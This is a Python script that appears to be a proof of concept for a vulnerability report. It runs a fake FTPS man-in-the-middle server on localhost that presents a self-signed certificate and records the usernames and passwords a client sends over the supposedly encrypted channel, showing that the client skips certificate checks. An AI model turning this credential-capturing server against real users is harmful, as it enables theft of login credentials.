#!/usr/bin/env python3
"""Fake FTPS MITM server.

Accepts one control connection, answers the FTP greeting, responds "234" to
AUTH TLS so the client upgrades to TLS immediately, then completes the TLS
handshake with a SELF-SIGNED certificate for CN=not-the-real-server and
records the plaintext FTP commands the client sends over that "encrypted"
channel (USER / PASS / PBSZ / PROT).

If any client ever aborted the handshake because of the untrusted
certificate, this process would print HANDSHAKE-FAILED and exit.

Writes the captured plaintext commands to the file given in argv[2] and
serves on 127.0.0.1:<argv[1]>.
"""
import socket
import ssl
import sys

HOST = "127.0.0.1"
CERT = "poc/mitm_server.pem"
KEY = "poc/mitm_server.key"

port = int(sys.argv[1])
outfile = sys.argv[2]

lines = []

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, port))
srv.listen(1)

conn, _ = srv.accept()
conn.settimeout(30)

# Send the FTP greeting (plaintext).
conn.sendall(b"220 fake-ftp MITM server ready\r\n")

# Read AUTH TLS, reply 234 -> client starts SSL_connect() right away.
auth = conn.recv(4096)
lines.append("[plain] " + auth.decode("latin1").strip())
if auth.upper().startswith(b"AUTH"):
    conn.sendall(b"234 AUTH TLS ok\r\n")
else:
    # Control run (plain FTP): the client never sends AUTH TLS, so no TLS
    # handshake can ever happen. Just reply to USER/PASS and stop.
    lines.append("NO-AUTH-TLS-RECEIVED: client never upgraded to TLS")
    conn.sendall(b"331 password required\r\n")
    nxt = conn.recv(4096)
    lines.append("[plain] " + nxt.decode("latin1").strip())
    conn.sendall(b"230 logged in\r\n")
    with open(outfile, "w") as f:
        f.write("\n".join(lines) + "\n")
    print("\n".join(lines))
    print("no TLS handshake attempted by either side; credentials stayed on the plaintext channel, no certificate was presented or accepted")
    srv.close()
    sys.exit(0)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(CERT, KEY)

try:
    tls = ctx.wrap_socket(conn, server_side=True)
except ssl.SSLError as e:
    lines.append("HANDSHAKE-FAILED: %s" % e)
    with open(outfile, "w") as f:
        f.write("\n".join(lines) + "\n")
    print("HANDSHAKE-FAILED: %s" % e)
    sys.exit(0)

lines.append("TLS-HANDSHAKE-COMPLETED with self-signed cert")

# Capture the plaintext FTP commands the client sends over TLS.
tls.settimeout(10)
while True:
    try:
        data = tls.recv(4096)
    except socket.timeout:
        break
    if not data:
        break
    for cmd in data.decode("latin1").split("\r\n"):
        if cmd:
            lines.append("[tls] " + cmd)
    # Answer commands so the client keeps going.
    up = data.upper()
    if up.startswith(b"USER"):
        tls.sendall(b"331 password required\r\n")
    elif up.startswith(b"PASS"):
        tls.sendall(b"230 logged in\r\n")
        break
    elif up.startswith(b"PBSZ"):
        tls.sendall(b"200 PBSZ ok\r\n")
    elif up.startswith(b"PROT"):
        tls.sendall(b"200 PROT ok\r\n")
    else:
        tls.sendall(b"200 ok\r\n")

with open(outfile, "w") as f:
    f.write("\n".join(lines) + "\n")
print("\n".join(lines))
srv.close()
